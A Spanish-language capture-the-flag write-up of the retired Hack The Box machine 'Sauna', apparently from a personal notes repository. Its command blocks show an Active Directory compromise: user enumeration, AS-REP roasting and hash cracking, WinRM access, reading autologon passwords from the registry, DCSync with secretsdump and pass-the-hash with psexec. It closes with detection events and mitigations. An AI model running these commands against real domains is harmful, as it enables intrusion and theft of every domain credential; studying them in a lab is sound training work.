---
machine: Sauna
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
pwned: 2026-11-09
tags: [windows, active-directory, kerberos, asrep, winrm, dcsync]
---

# Sauna — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

## TL;DR

El sitio corporativo publica los nombres del equipo, así que el formato de usuario sale sin esfuerzo. Con la lista se hace **AS-REP roasting** sobre la cuenta sin preautenticación, se crackea el hash y se entra por WinRM. Dentro, las credenciales de autologon quedan en claro en el registro; esa cuenta de servicio tiene derechos de replicación y con ella se ejecuta **DCSync**.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,5985 <TARGET_IP>
```

| Puerto | Servicio |
|---|---|
| 80/tcp | IIS — `egotistical-bank.htb` |
| 88/389/636 | Kerberos y LDAP |
| 445/tcp | SMB |
| 5985/tcp | WinRM |

## Enumeración

La página "Meet the team" da nombres y apellidos. El formato es inicial + apellido (`fsmith`, `ssmith`, `hsmith`), y el dominio `EGOTISTICAL-BANK.HTB`.

```bash
echo 'egotistical-bank.htb' | tee -a /etc/hosts
kerbrute userenum -d egotistical-bank.htb --dc <TARGET_IP> users.txt
```

## Foothold

```bash
impacket-GetNPUsers 'egotistical-bank.htb/' -dc-ip <TARGET_IP> -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

Con la contraseña:

```bash
evil-winrm -i <TARGET_IP> -u fsmith -p '<password>'
type C:\Users\fsmith\Desktop\user.txt
```

## Movimiento lateral

En el host, WinPEAS (o una consulta directa) lee las credenciales de autologon que Windows guarda en claro:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# DefaultUserName / DefaultPassword -> svc_loanmanager
```

Ojo con el nombre: el valor del registro es `svc_loanmanager`, pero el `sAMAccountName` real es `svc_loanmgr`; con el primero WinRM falla. Se comprueba con NetExec y se entra con el segundo:

```bash
nxc smb <TARGET_IP> -u svc_loanmgr -p '<password>'
evil-winrm -i <TARGET_IP> -u svc_loanmgr -p '<password>'
```

## Escalada de privilegios

`svc_loanmgr` tiene derechos de replicación, así que se vuelca la base:

```bash
impacket-secretsdump 'egotistical-bank.htb/svc_loanmgr:<newpass>@<TARGET_IP>' -just-dc-user Administrator
```

Con el hash de Administrator: `impacket-psexec -hashes ':<NT_HASH>' administrator@<TARGET_IP>`.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`KDC_ERR_C_PRINCIPAL_UNKNOWN`** → el formato de usuario no es el que crees; prueba también nombre.apellido.
- **AS-REP sin resultados** → la cuenta sí requiere preautenticación; el roasting no aplica.
- **`Access is denied` en WinRM** → el usuario no está en `Remote Management Users`.
- **DCSync denegado** → la cuenta no tiene `DS-Replication-Get-Changes`; revisa la ACL real en BloodHound.

## Mitigaciones y detección

- **4768** sin preautenticación (AS-REP) y **4769** anómalos.
- Desactivar `DONT_REQ_PREAUTH` en cuentas de servicio y usar contraseñas largas.
- No dejar `DefaultPassword` en `Winlogon`: usar LAPS o cuentas gestionadas para el autologon.
- Revisar `DS-Replication-Get-Changes` en cuentas de servicio y alertar de `secretsdump` (DRSUAPI).

MITRE: T1558.004, T1098, T1003.006.

## Referencias

- [MITRE T1003.006](https://attack.mitre.org/techniques/T1003/006/)
- [MITRE T1098](https://attack.mitre.org/techniques/T1098/)
- [MITRE T1558.004](https://attack.mitre.org/techniques/T1558/004/)
- [kerberos-enum](../../../knowledge/windows/kerberos-enum.md)
